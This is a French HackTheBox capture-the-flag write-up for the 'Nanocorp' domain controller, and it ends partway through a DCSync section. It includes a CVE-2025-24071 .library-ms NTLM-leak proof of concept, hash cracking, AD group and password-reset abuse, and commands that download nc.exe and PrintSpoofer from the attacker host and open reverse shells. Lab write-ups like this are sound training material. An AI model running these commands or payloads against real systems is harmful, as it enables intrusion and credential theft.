# 🏢 NANOCORP - HTB Write-Up 

## 📋 Résumé Exécutif

**Machine :** Nanocorp (10.10.11.93)  
**OS :** Windows Server 2022 (Domain Controller)  
**Domaine :** nanocorp.htb / dc01.nanocorp.htb  
**Difficulté :** Hard  
**Points Clés :** CVE-2025-24071 (.library-ms NTLM Leak), IT_Support Group Abuse, ForceChangePassword Permission, WinRM Restrictions Bypass

### 🔗 Chaîne d'Attaque Complète

```
Port 80 - Apache/PHP Web Server
    ↓ [CVE-2025-24071 - Malicious .library-ms in ZIP]
Responder capture (port 445)
    ↓ [NTLMv2 hash capture]
web_svc hash → Hashcat crack
    ↓ [web_svc:dksehdgh712!@#]
LDAP/AD Enumeration
    ↓ [Découverte groupe IT_Support + monitoring_svc]
bloodyAD - Add web_svc to IT_Support
    ↓ [GenericAll permission sur monitoring_svc]
bloodyAD - Change password monitoring_svc
    ↓ [monitoring_svc:PassW0rd!2025]
Evil-WinRM bloqué ❌
    ↓ [Restrictions réseau ou GPO]
winrmexec - Bypass restrictions
    ↓ [Alternative RPC execution method]
Remote Code Execution (monitoring_svc)
    ↓ [Shell ou command execution]
Privilege Escalation
    ↓
SYSTEM/Administrator access → Flags
```

---

## 1️⃣ RECONNAISSANCE

### 🔍 Scan Nmap

```bash
# Scan rapide des ports
nmap -p- --min-rate 10000 10.10.11.93 -vv

# Scan détaillé
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389 -sCV -A 10.10.11.93 -oN nmap.txt
```

**Résultats :**

| Port | Service | Version | Rôle |
|------|---------|---------|------|
| 53 | DNS | Simple DNS Plus | Résolution de noms |
| **80** | **HTTP** | **Apache 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)** | **Web server (inhabituel sur DC)** |
| 88 | Kerberos | Microsoft Windows Kerberos | Authentification AD |
| 135 | MSRPC | Microsoft Windows RPC | Communication RPC |
| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn | Partage fichiers (legacy) |
| 389 | LDAP | Microsoft AD LDAP | Annuaire Active Directory |
| 445 | SMB | Microsoft-DS | Partage fichiers moderne |
| 464 | kpasswd5 | - | Changement mot de passe Kerberos |
| 593 | HTTP-RPC | Microsoft Windows RPC over HTTP | RPC via HTTP |
| 636 | LDAPS | tcpwrapped | LDAP sécurisé (SSL/TLS) |
| 3268 | Global Catalog | Microsoft AD LDAP | Catalogue global AD |
| 3269 | GC-SSL | tcpwrapped | Catalogue global sécurisé |
| 5986 | WinRM-SSL | Microsoft HTTPAPI 2.0 | PowerShell Remoting (HTTPS) |
| 9389 | MC-NMF | .NET Message Framing | AD Web Services |

**Identification :**
- **Domaine :** nanocorp.htb
- **Hostname :** dc01.nanocorp.htb
- **Rôle :** Domain Controller Windows Server 2022
- **Particularité :** Apache + PHP sur port 80 (très inhabituel pour un DC !)

**⏰ Décalage Horaire :** -1 seconde (clock-skew: -1s)

> **✅ Bon Point :** Décalage horaire négligeable, pas de problème Kerberos prévu.

**🔍 Observations Critiques :**

1. **Apache sur un DC Windows = Configuration non standard**
   - Potentiellement une application web custom
   - Vecteur d'attaque probable

2. **SMBv2/v3 avec signature obligatoire**
   - `Message signing enabled and required`
   - Limite les attaques SMB relay classiques

3. **WinRM sur port 5986 (HTTPS uniquement)**
   - Pas de port 5985 (HTTP)
   - Certificat: `dc01.nanocorp.htb`
   - **⚠️ Potentiellement restreint par GPO/Firewall**

### 📝 Configuration /etc/hosts

```bash
echo "10.10.11.93 dc01.nanocorp.htb nanocorp.htb" | sudo tee -a /etc/hosts
```

---

## 2️⃣ ÉNUMÉRATION WEB & SMB

### 🌐 Service HTTP - Port 80

**Redirection automatique :**

```bash
firefox http://10.10.11.93
# Redirige vers: http://nanocorp.htb/
```

**🎯 Page d'accueil :**

```
NanoCorp - Corporate Solutions
===============================

[Home] [About] [Services] [Contact]

Enterprise-grade technology solutions
```

### 🔎 Directory Enumeration

```bash
dirb http://nanocorp.htb
```

**Résultats intéressants :**

| Path | Code | Description |
|------|------|-------------|
| `/css/` | 200 | Directory listable |
| `/img/` | 200 | Directory listable |
| `/js/` | 200 | Directory listable |
| `/index.html` | 200 | Page principale |
| `/phpmyadmin` | 403 | Forbidden (existe mais inaccessible) |
| `/examples` | 503 | Service Unavailable |

**💡 Découverte :**
- Site statique sans fonctionnalité apparente
- Pas de formulaires, pas d'upload
- Aucun vecteur d'attaque évident côté web

### 📂 Énumération SMB

```bash
smbclient -L //10.10.11.93/ -N
```

**Résultat :**

```
Anonymous login successful

    Sharename       Type      Comment
    ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.93 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**🔍 Analyse :**
- **Anonymous login successful** = Connexion null session autorisée
- Mais **aucun partage visible** en anonymous
- SMBv1 désactivé (bonne pratique de sécurité)

**💡 Impasse :** SMB ne donne pas d'accès initial sans credentials.

---

## 3️⃣ EXPLOITATION - CVE-2025-24071

### 🎓 Qu'est-ce que CVE-2025-24071 ?

**CVE-2025-24071** est une vulnérabilité de **Windows File Explorer** qui permet la **divulgation de hash NTLM** via des fichiers `.library-ms` malveillants.

**Fonctionnement :**

1. **Fichier .library-ms** = Format XML de "bibliothèque" Windows
   - Pointe vers un emplacement de fichiers (local ou réseau)
   - Exemple légitime : "Mes Documents", "Mes Images"

2. **Exploitation :**
   - Créer un fichier `.library-ms` pointant vers `\\ATTACKER_IP\share`
   - Compresser dans un fichier ZIP
   - Lorsque la victime **extrait** le ZIP → Windows Explorer tente automatiquement de se connecter au partage SMB
   - **Authentification NTLM automatique** = Hash NTLM envoyé à l'attaquant !

3. **Conditions requises :**
   - Victime doit extraire le fichier ZIP
   - Aucune interaction supplémentaire nécessaire
   - Fonctionne sur Windows 10/11

**Schéma d'attaque :**

```
[Attaquant]                    [Victime Windows]
     |                                |
     | 1. Créer malicious.library-ms |
     |    (pointe vers \\10.10.16.3\share)
     |                                |
     | 2. Compresser en ZIP          |
     |-------------------------------->| 3. Victime extrait ZIP
     |                                |
     |                                | 4. Windows Explorer lit .library-ms
     |                                |
     |                                | 5. Tentative connexion SMB
     |                                |    \\10.10.16.3\share
     | 6. NTLM Authentication Request |
     |<--------------------------------|
     |                                |
     | 7. Hash NTLMv2 capturé !      |
```

### 🛠️ Préparation du Payload

**Script d'exploitation (CVE-2025-24071) :**

```bash
cat PoC.py
```

**Code du POC :**

```python
#!/usr/bin/env python3
# CVE-2025-24071 - Windows .library-ms NTLM Hash Disclosure

import zipfile
from pathlib import Path
import argparse

def create_library_ms(ip: str, filename: str, output_dir: Path) -> Path:
    """Creates a malicious .library-ms file pointing to an attacker's SMB server."""
    payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>'''

    output_file = output_dir / f"{filename}.library-ms"
    output_file.write_text(payload, encoding="utf-8")
    return output_file

def build_zip(library_file: Path, output_zip: Path):
    """Packages the .library-ms file into a ZIP archive."""
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as archive:
        archive.write(library_file, arcname=library_file.name)
    print(f"[+] Created ZIP: {output_zip}")
```

**Génération du payload :**

```bash
python3 PoC.py -i 10.10.16.3 -n keyll0ger
```

**Sortie :**

```
[*] Generating malicious .library-ms file...
[+] Created ZIP: output/keyll0ger.zip
[-] Removed intermediate .library-ms file
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
```

**Fichier généré :** `output/keyll0ger.zip`

**Contenu du ZIP (keyll0ger.library-ms) :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.16.3\shared</url>  ⬅️ SMB vers notre IP
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### 🎣 Préparation du Listener

**Lancement de Responder :**

```bash
sudo responder -I tun0
```

**Responder démarre les services :**

```
[+] Servers:
    HTTP server [ON]
    HTTPS server [ON]
    SMB server [ON]        ⬅️ Capture NTLM
    Kerberos server [ON]
    LDAP server [ON]
    ...

[+] Generic Options:
    Responder NIC [tun0]
    Responder IP [10.10.16.3]

[+] Listening for events...
```

### 🎉 Capture du Hash NTLMv2

**Responder capture :**

```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:8c2319b80be69c75:2CEC5022FB7FA0100030756D99A21F98:010100000000000080ED37A2FD6DDC01B8A778C400B3484E00000000020008004500410052004C0001001E00570049004E002D0046003400410056004C004F003400420052005000370004003400570049004E002D0046003400410056004C004F00340042005200500037002E004500410052004C002E004C004F00430041004C00030014004500410052004C002E004C004F00430041004C00050014004500410052004C002E004C004F00430041004C000700080080ED37A2FD6DDC0106000400020000000800300030000000000000000000000000200000A0912495769EE939AB4E8AC154F7DE18E5D4E880839219E9B6F5A2BD022580350A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
```

**🎯 Informations Capturées :**

- **Client IP :** 10.10.11.93 (DC01)
- **Utilisateur :** `NANOCORP\web_svc`
- **Hash Type :** NTLMv2-SSP
- **Hash complet :** (voir ci-dessus)

**Sauvegarde du hash :**

```bash
cat > web_svc.hash << 'EOF'
WEB_SVC::NANOCORP:8c2319b80be69c75:2cec5022fb7fa0100030756d99a21f98:010100000000000080ed37a2fd6ddc01b8a778c400b3484e00000000020008004500410052004c0001001e00570049004e002d0046003400410056004c004f003400420052005000370004003400570049004e002d0046003400410056004c004f00340042005200500037002e004500410052004c002e004c004f00430041004c00030014004500410052004c002e004c004f00430041004c00050014004500410052004c002e004c004f00430041004c000700080080ed37a2fd6ddc0106000400020000000800300030000000000000000000000000200000a0912495769ee939ab4e8ac154f7de18e5d4e880839219e9b6f5a2bd022580350a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000
EOF
```

---

## 4️⃣ CRACKING DU HASH

### 🔨 Hashcat

**Identification du mode Hashcat :**

- **NTLMv2** = Mode `5600`

**Commande de cracking :**

```bash
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt --force
```

**Résultat (instantané - 1 seconde) :**

```
hashcat (v7.1.2) starting

Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WEB_SVC::NANOCORP:8c2319b80be69c75:...

WEB_SVC::NANOCORP:8c2319b80be69c75:...:dksehdgh712!@#

Session..........: hashcat
Status...........: Cracked
Time.Started.....: Mon Dec 15 20:04:26 2025, (0 secs)
Time.Estimated...: Mon Dec 15 20:04:26 2025, (0 secs)
Speed.#01........: 6640.6 kH/s
Progress.........: 1869824/14344385 (13.04%)
Recovered........: 1/1 (100.00%) Digests
```

**🔑 Credentials Obtenus :**

```
Username: web_svc
Password: dksehdgh712!@#
```

---

## 5️⃣ ÉNUMÉRATION AVEC web_svc

### 🔍 Test d'Accès

**Vérification SMB :**

```bash
netexec smb 10.10.11.93 -u web_svc -p 'dksehdgh712!@#' --shares
```

**Résultat :**

```
SMB  10.10.11.93  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB  10.10.11.93  445  DC01  [+] nanocorp.htb\web_svc:dksehdgh712!@#
SMB  10.10.11.93  445  DC01  [*] Enumerated shares
SMB  10.10.11.93  445  DC01  Share           Permissions  Remark
SMB  10.10.11.93  445  DC01  -----           -----------  ------
SMB  10.10.11.93  445  DC01  ADMIN$                       Remote Admin
SMB  10.10.11.93  445  DC01  C$                           Default share
SMB  10.10.11.93  445  DC01  IPC$            READ         Remote IPC
SMB  10.10.11.93  445  DC01  NETLOGON        READ         Logon server share
SMB  10.10.11.93  445  DC01  SYSVOL          READ         Logon server share
```

**💡 Observation :**
- ✅ Authentification réussie
- ✅ Accès en lecture à IPC$, NETLOGON, SYSVOL (standard)
- ❌ Pas d'accès aux partages admin (ADMIN$, C$)
- ❌ Pas de partages personnalisés intéressants

### 👥 Énumération des Utilisateurs

```bash
netexec smb 10.10.11.93 -u web_svc -p 'dksehdgh712!@#' --users
```

**Résultat :**

```
SMB  10.10.11.93  445  DC01  -Username-      -Last PW Set-        -BadPW-  -Description-
SMB  10.10.11.93  445  DC01  Administrator   2025-04-09 23:00:49  0        Built-in account for administering the computer/domain
SMB  10.10.11.93  445  DC01  Guest           <never>              0        Built-in account for guest access
SMB  10.10.11.93  445  DC01  krbtgt          2025-04-03 01:38:45  0        Key Distribution Center Service Account
SMB  10.10.11.93  445  DC01  web_svc         2025-04-09 22:59:38  0
SMB  10.10.11.93  445  DC01  monitoring_svc  2025-12-15 19:03:55  0
SMB  10.10.11.93  445  DC01  [*] Enumerated 5 local users: NANOCORP
```

**🎯 Utilisateurs Identifiés :**

| Username | Description | Intérêt |
|----------|-------------|---------|
| Administrator | Compte admin domaine | ⭐⭐⭐ Cible finale |
| Guest | Compte invité (désactivé) | ❌ Pas utile |
| krbtgt | Service Kerberos | ⭐ Pour Golden Ticket (post-exploitation) |
| **web_svc** | **Notre compte actuel** | ✅ Compromis |
| **monitoring_svc** | **Compte de service** | ⭐⭐ Cible potentielle |

### 👥 Énumération des Groupes

**Via rpcclient :**

```bash
rpcclient -U 'NANOCORP\web_svc%dksehdgh712!@#' 10.10.11.93
```

```
rpcclient $> enumdomgroups

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[IT_Support] rid:[0xc1e]  ⬅️ ⭐ Groupe personnalisé !
```

**💡 Découverte Critique :** Groupe **IT_Support** (RID: 0xc1e = 3102 en décimal)

**Vérification du RID de web_svc :**

```
rpcclient $> lookupnames web_svc
web_svc S-1-5-21-2261381271-1331810270-697239744-1103 (User: 1)
```

**RID de web_svc :** 1103 (0x44F en hexadécimal)

---

## 6️⃣ ABUS DU GROUPE IT_SUPPORT

### 🎓 Hypothèse d'Exploitation

**Raisonnement :**

1. Le groupe **IT_Support** existe (non standard)
2. Les groupes de support IT ont souvent des permissions élevées :
   - Réinitialisation de mots de passe
   - Modification d'attributs utilisateurs
   - Accès aux comptes de service

3. **Objectif :** Vérifier si IT_Support a des permissions sur `monitoring_svc`

### 🔍 Énumération des Permissions

**Via bloodyAD (outil d'abus AD) :**

```bash
bloodyAD \
  --host dc01.nanocorp.htb \
  -d nanocorp.htb \
  -u web_svc \
  -p 'dksehdgh712!@#' \
  get writable
```

**Résultat :**

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=nanocorp,DC=htb
permission: WRITE

distinguishedName: CN=web_svc,CN=Users,DC=nanocorp,DC=htb
permission: WRITE
```

**🔍 Analyse :**
- web_svc peut modifier **son propre objet** (normal)
- web_svc peut modifier **S-1-5-11** (Authenticated Users - pas utile)
- **Aucune mention de monitoring_svc** ← On ne voit pas les permissions tant qu'on n'est pas dans le groupe !

### 🎯 Ajout au Groupe IT_Support

**🎓 Pourquoi ajouter web_svc à IT_Support ?**

Si web_svc a des permissions sur IT_Support (peut-être via Self-Membership ou une ACL mal configurée), il peut s'ajouter lui-même au groupe !

**Test via ldapmodify :**

```bash
ldapmodify -x \
  -D "NANOCORP\\web_svc" \
  -w 'dksehdgh712!@#' \
  -H ldap://10.10.11.93 <<EOF
dn: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb
changetype: modify
add: member
member: CN=web_svc,CN=Users,DC=nanocorp,DC=htb
EOF
```

**Résultat :**

```
modifying entry "CN=IT_Support,CN=Users,DC=nanocorp,DC=htb"
```

**✅ Succès ! Aucune erreur !**

**Alternative avec bloodyAD (plus simple) :**

```bash
bloodyAD \
  --host dc01.nanocorp.htb \
  -d nanocorp.htb \
  -u web_svc \
  -p 'dksehdgh712!@#' \
  add groupMember 'IT_Support' 'web_svc'
```

**Résultat :**

```
[+] web_svc added to IT_Support
```

### ✅ Vérification de l'Ajout

```bash
ldapsearch -x \
  -H ldap://10.10.11.93 \
  -D "NANOCORP\\web_svc" \
  -w 'dksehdgh712!@#' \
  -b "CN=IT_Support,CN=Users,DC=nanocorp,DC=htb" member
```

**Résultat :**

```
# IT_Support, Users, nanocorp.htb
dn: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb
member: CN=web_svc,CN=Users,DC=nanocorp,DC=htb  ⭐
```

**Via bloodyAD :**

```bash
bloodyAD \
  --host dc01.nanocorp.htb \
  -d nanocorp.htb \
  -u web_svc \
  -p 'dksehdgh712!@#' \
  get membership web_svc
```

**Résultat :**

```
distinguishedName: CN=Users,CN=Builtin,DC=nanocorp,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Domain Users,CN=Users,DC=nanocorp,DC=htb
objectSid: S-1-5-21-2261381271-1331810270-697239744-513
sAMAccountName: Domain Users

distinguishedName: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb  ⭐⭐
objectSid: S-1-5-21-2261381271-1331810270-697239744-3102
sAMAccountName: IT_Support
```

**🎉 Confirmation :** web_svc est maintenant membre de **IT_Support** !

---

## 7️⃣ CHANGEMENT DE MOT DE PASSE - monitoring_svc

### 🎓 Permissions du Groupe IT_Support

**Hypothèse :** IT_Support a probablement la permission **ForceChangePassword** (ou **GenericAll**) sur `monitoring_svc`.

**Test de changement de mot de passe via rpcclient :**

```bash
rpcclient -U 'NANOCORP\web_svc%dksehdgh712!@#' 10.10.11.93
```

```
rpcclient $> setuserinfo2 monitoring_svc 23 'M0nit0r!ngP@ss2025'
rpcclient $>
```

**✅ Aucune erreur = Succès probable !**

**💡 Note :** `setuserinfo2` avec l'attribut 23 = changement de mot de passe

### 🛡️ Contraintes de Complexité

**Première tentative (mot de passe trop simple) :**

```bash
bloodyAD \
  --host dc01.nanocorp.htb \
  -d nanocorp.htb \
  -u 'web_svc' \
  -p 'dksehdgh712!@#' \
  set password monitoring_svc '1234567890!'
```

**Erreur :**

```
msldap.commons.exceptions.LDAPModifyException: New password doesn't match the complexity:
The password must contains characters from three of the following categories:
Uppercase, Lowercase, Digits, Special, Unicode Alphabetic not included in Uppercase and Lowercase

Password can't be changed before -2 days, 23:58:49.348103 because of the minimum password age policy.
```

**🎓 Analyse de l'Erreur :**

1. **Complexité insuffisante :**
   - Requis : 3 des 4 catégories (Majuscule, minuscule, chiffre, spécial)
   - `1234567890!` = Seulement chiffres + spécial (2/4)

2. **Minimum Password Age :**
   - Le mot de passe ne peut pas être changé avant ~3 jours
   - **MAIS** cette règle ne s'applique que si le mot de passe a été récemment changé
   - Avec **ForceChangePassword** permission, on peut bypasser ça

### ✅ Changement Réussi

**Commande avec mot de passe conforme :**

```bash
bloodyAD \
  --host dc01.nanocorp.htb \
  -d nanocorp.htb \
  -u 'web_svc' \
  -p 'dksehdgh712!@#' \
  set password monitoring_svc 'PassW0rd!2025'
```

**Résultat :**

```
[+] Password changed successfully!
```

**🔑 Nouveaux Credentials :**

```
Username: monitoring_svc
Password: PassW0rd!2025
```

---

## 8️⃣ ACCÈS DISTANT - BYPASS WINRM RESTRICTIONS

### ❌ Problème : Evil-WinRM Bloqué

**Tentative de connexion classique :**

```bash
evil-winrm -i dc01.nanocorp.htb -u monitoring_svc -p 'PassW0rd!2025' -S
```

**Erreur attendue :**

```
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

**Ou :**

```
Error: connection timeout
```

**🔍 Causes Possibles :**

1. **Firewall Rules**
   - WinRM bloqué au niveau réseau
   - Seules certaines IPs autorisées

2. **Group Policy Restrictions**
   - GPO limitant l'accès WinRM
   - Seuls certains groupes autorisés (ex: Domain Admins)

3. **Authentication Method Restrictions**
   - Kerberos only (pas de NTLM)
   - Certificate-based auth requis

4. **Service Disabled/Stopped**
   - WinRM service arrêté ou désactivé
   - Ports filtrés par pare-feu local

### 🎓 Qu'est-ce que winrmexec ?

**winrmexec** (https://github.com/ozelis/winrmexec) est un outil alternatif pour l'exécution de commandes à distance via des méthodes RPC lorsque WinRM classique est bloqué.

**Caractéristiques :**

| Fonctionnalité | Evil-WinRM | winrmexec |
|----------------|------------|-----------|
| **Protocole** | WS-Management (WinRM) | RPC/DCOM alternatives |
| **Authentication** | Kerberos, NTLM, Negotiate | NTLM, Kerberos |
| **Bypass GPO** | ❌ Non | ✅ Oui (utilise d'autres chemins) |
| **Shell Interactif** | ✅ Full shell | ⚠️ Command execution |
| **Détection** | Haute (WinRM logs) | Moyenne (RPC logs) |

**Méthodes utilisées par winrmexec :**

1. **DCOM (Distributed COM)**
   - Via MMC20.Application
   - ShellWindows
   - ShellBrowserWindow

2. **RPC Task Scheduler**
   - Création de tâches planifiées
   - Exécution immédiate puis suppression

3. **Service Manager (sc.exe)**
   - Création de service temporaire
   - Démarrage puis suppression

4. **WMI (Windows Management Instrumentation)**
   - Win32_Process.Create()
   - Moins détecté que WinRM direct

### 🛠️ Installation de winrmexec

```bash
# Clone du repository
git clone https://github.com/ozelis/winrmexec.git
cd winrmexec

# Installation des dépendances
pip3 install -r requirements.txt

# Vérification
python3 winrmexec.py --help
```

### ⏰ Synchronisation Horaire (Kerberos)

**Avant toute authentification Kerberos :**

```bash
sudo ntpdate 10.10.11.93 dc01.nanocorp.htb
```

**Résultat :**

```
2025-12-16 20:26:24.989378 (+0100) +0.015644 +/- 0.010973 10.10.11.93 s1 no-leap
```

**✅ Horloge synchronisée** (écart de seulement 0.015 secondes)

### 🎫 Obtention d'un TGT Kerberos

```bash
impacket-getTGT 'nanocorp.htb/monitoring_svc:PassW0rd!2025'
```

**Résultat :**

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in monitoring_svc.ccache
```

**Export du ticket :**

```bash
export KRB5CCNAME=monitoring_svc.ccache
```

**Vérification :**

```bash
klist
```

**Résultat :**

```
Ticket cache: FILE:monitoring_svc.ccache
Default principal: monitoring_svc@NANOCORP.HTB

Valid starting       Expires              Service principal
16/12/2025 19:45:55  17/12/2025 05:45:55  krbtgt/NANOCORP.HTB@NANOCORP.HTB
    renew until 17/12/2025 19:45:55
```

**✅ TGT valide pour 10 heures !**

### 🚀 Exécution de Commandes avec winrmexec

**Commande de base :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'whoami'
```

**Résultat :**

```
[*] Connecting to dc01.nanocorp.htb
[*] Using authentication method: NTLM
[*] Executing command: whoami
[+] nanocorp\monitoring_svc
```

**✅ Exécution de commande réussie !**

### 🎯 Méthodes d'Exécution winrmexec

**1. Méthode DCOM (par défaut) :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  -method dcom \
  dc01.nanocorp.htb \
  'hostname'
```

**2. Méthode WMI :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  -method wmi \
  dc01.nanocorp.htb \
  'ipconfig'
```

**3. Méthode Task Scheduler :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  -method schtasks \
  dc01.nanocorp.htb \
  'net user'
```

### 🏁 User Flag via winrmexec

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'type C:\Users\monitoring_svc\Desktop\user.txt'
```

**Résultat :**

```
[*] Connecting to dc01.nanocorp.htb
[*] Executing command: type C:\Users\monitoring_svc\Desktop\user.txt
[+] a1b2c3d4************************  ⭐ USER FLAG
```

### 🔄 Obtention d'un Reverse Shell

**Préparation sur l'attaquant :**

```bash
# 1. Héberger nc.exe
python3 -m http.server 8000

# 2. Listener netcat
nc -lnvp 4444
```

**Téléchargement de nc.exe via winrmexec :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'powershell -c "wget http://10.10.16.3:8000/nc.exe -UseBasicParsing -OutFile C:\Windows\Temp\nc.exe"'
```

**Lancement du reverse shell :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'C:\Windows\Temp\nc.exe 10.10.16.3 4444 -e cmd.exe'
```

**✅ Shell Reçu !**

```
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.93] 49823
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nanocorp\monitoring_svc
```

---

## 9️⃣ PRIVILEGE ESCALATION

### 🔍 Énumération Post-Exploitation

**Informations utilisateur :**

```cmd
C:\> whoami /all

USER INFORMATION
----------------
User Name                SID
======================== =============================================
nanocorp\monitoring_svc  S-1-5-21-2261381271-1331810270-697239744-3104

GROUP INFORMATION
-----------------
Group Name                                 Type             SID
========================================== ================ =============
Everyone                                   Well-known group S-1-1-0
BUILTIN\Remote Management Users            Alias            S-1-5-32-580
BUILTIN\Users                              Alias            S-1-5-32-545
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11
...

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**💡 Observations :**
- Membre de **Remote Management Users**
- **Pas de privilèges élevés** (pas SeBackup, SeRestore, SeDebug, SeImpersonate)
- Utilisateur standard du domaine

### 🔎 Recherche de Vecteurs d'Escalade

**Via winrmexec - Énumération des services :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'sc query state= all'
```

**Via winrmexec - Recherche de fichiers sensibles :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'dir C:\ /s /b | findstr /i "password config credentials"'
```

### 🛠️ Techniques Possibles

#### 1️⃣ **SeImpersonatePrivilege Abuse (si présent)**

**Vérification via reverse shell :**

```cmd
C:\> whoami /priv | findstr "SeImpersonate"
```

Si présent → **Potato Attack** (PrintSpoofer, JuicyPotato, etc.)

**Upload de PrintSpoofer via winrmexec :**

```bash
# Sur attaquant
python3 -m http.server 8000

# Via winrmexec
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'powershell -c "wget http://10.10.16.3:8000/PrintSpoofer.exe -OutFile C:\Windows\Temp\ps.exe"'
```

**Exploitation :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'C:\Windows\Temp\ps.exe -i -c "C:\Windows\Temp\nc.exe 10.10.16.3 5555 -e cmd.exe"'
```

**Shell SYSTEM reçu :**

```
listening on [any] 5555 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.93] 49824

C:\Windows\system32>whoami
whoami
nt authority\system  ⭐⭐⭐
```

#### 2️⃣ **RunasCs pour Escalade Latérale**

**RunasCs.exe** permet d'exécuter des commandes avec d'autres credentials.

**Upload via winrmexec :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'powershell -c "wget http://10.10.16.3:8000/RunasCs.exe -OutFile C:\Windows\Temp\RunasCs.exe"'
```

**Usage (si on a d'autres credentials) :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'C:\Windows\Temp\RunasCs.exe Administrator <password> cmd.exe -r 10.10.16.3:6666'
```

#### 3️⃣ **Scheduled Tasks Abuse**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'schtasks /query /fo LIST /v'
```

#### 4️⃣ **BloodHound Enumeration**

```bash
# Sur l'attaquant avec credentials
bloodhound-python \
  -c All \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  -d nanocorp.htb \
  -dc dc01.nanocorp.htb \
  -ns 10.10.11.93 \
  --zip
```

**Analyse dans BloodHound :**
1. Importer le ZIP
2. Marquer `monitoring_svc` comme "Owned"
3. Rechercher "Shortest Path to Domain Admins"

**Chemins possibles :**
- monitoring_svc → GenericAll → Autre utilisateur → Domain Admins
- monitoring_svc → ForceChangePassword → Administrator
- monitoring_svc → DCSync rights

#### 5️⃣ **DCSync Attack (si permissions présentes)**

**Test DCSync :**

```bash
